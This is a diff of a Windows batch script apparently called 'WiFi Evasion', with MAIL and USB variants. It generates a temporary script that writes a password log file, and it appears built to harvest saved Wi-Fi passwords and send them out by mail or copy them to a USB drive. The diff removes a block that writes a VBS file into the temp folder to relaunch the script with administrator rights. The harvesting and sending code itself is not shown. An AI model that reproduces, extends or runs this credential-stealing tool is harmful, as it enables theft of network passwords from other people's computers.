@@ -43,19 +43,8 @@ SET N="WiFi-Evasion-[MAIL.-VERSION]-TEMP.BAT"
         ECHO TITLE WiFi Evasion [MAIL] - LESiO
         ECHO MODE CON COLS^=18 LINES^=1
         ECHO CLS ^& COLOR 05
-        ECHO IF _%%1_^=^=_SCRIPT_ GOTO :SCRIPT
         ECHO SET C^=0 
         ECHO SET L^=0 
-        ECHO :UAC
-        ECHO     SET UAC^=%%TEMP%%\UAC.VBS
-        ECHO ^(
-        ECHO     ECHO SET UAC ^= CREATEOBJECT^^^("SHELL.APPLICATION"^^^)
-        ECHO     ECHO UAC.SHELLEXECUTE "%%~S0"^, "SCRIPT %%~SDP0 %%*"^, ""^, "RUNAS"^, 1
-        ECHO ^)^> "%%UAC%%"
-        ECHO     "%%TEMP%%\UAC.VBS"
-        ECHO     DEL "%%TEMP%%\UAC.VBS"
-        ECHO GOTO :EOF
-        ECHO :SCRIPT
         ECHO CALL :S
         ECHO CALL :L
         ECHO SET O^=%%RANDOM%%%%RANDOM%%%%RANDOM%%
@@ -168,19 +157,8 @@ GOTO :EOF
         ECHO TITLE WiFi Evasion [USB] - LESiO
         ECHO MODE CON COLS^=18 LINES^=1
         ECHO CLS ^& COLOR 05
-        ECHO IF _%%1_^=^=_SCRIPT_ GOTO :SCRIPT
         ECHO SET C^=0
         ECHO SET L^=0
-        ECHO :UAC
-        ECHO     SET UAC^=%%TEMP%%\UAC.VBS
-        ECHO ^(
-        ECHO     ECHO SET UAC ^= CREATEOBJECT^^^("SHELL.APPLICATION"^^^)
-        ECHO     ECHO UAC.SHELLEXECUTE "%%~S0"^, "SCRIPT %%~SDP0 %%*"^, ""^, "RUNAS"^, 1
-        ECHO ^)^> "%%UAC%%"
-        ECHO     "%%TEMP%%\UAC.VBS"
-        ECHO     DEL "%%TEMP%%\UAC.VBS"
-        ECHO GOTO :EOF
-        ECHO :SCRIPT
         ECHO CALL :S
         ECHO CALL :L
         ECHO SET PASSWORDLOGS^=WiFi-Evasion-[USB.-Version].TXT
